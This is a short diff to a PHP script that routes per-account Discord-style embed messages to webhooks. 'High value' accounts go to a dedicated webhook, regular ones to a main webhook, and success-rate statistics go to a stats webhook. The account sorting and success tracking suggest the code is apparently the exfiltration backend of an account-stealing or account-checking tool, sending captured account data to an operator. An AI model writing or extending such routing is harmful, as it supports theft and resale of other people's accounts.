@@ -921,16 +921,28 @@ try {
         ]]
     ];
 
-    sendWebhook($webhookUrl, $embed1);
-    sleep(2);
-    sendWebhook($webhookUrl, $embed2);
-
+    // ================================================
+    // SEND WEBHOOKS - High value OR regular (EXCLUSIVE)
+    // ================================================
+    
     if ($isHighValue && !empty($highValueWebhookUrl)) {
+        // HIGH VALUE ACCOUNT - Send ONLY to high-value webhook
+        error_log("HIGH VALUE ACCOUNT: Sending to high-value webhook only");
+        
         sendWebhook($highValueWebhookUrl, $embed1);
-        sleep(1);
+        sleep(2);
         sendWebhook($highValueWebhookUrl, $embed2);
+        
+    } else if (!$isHighValue && !empty($webhookUrl)) {
+        // REGULAR ACCOUNT - Send to main webhook
+        error_log("REGULAR ACCOUNT: Sending to main webhook");
+        
+        sendWebhook($webhookUrl, $embed1);
+        sleep(2);
+        sendWebhook($webhookUrl, $embed2);
     }
 
+    // Always send stats (if configured)
     if (!empty($statsWebhookUrl)) {
         $successRate = $stats['total'] > 0 ? round(($stats['success'] / $stats['total']) * 100, 2) : 0;
         
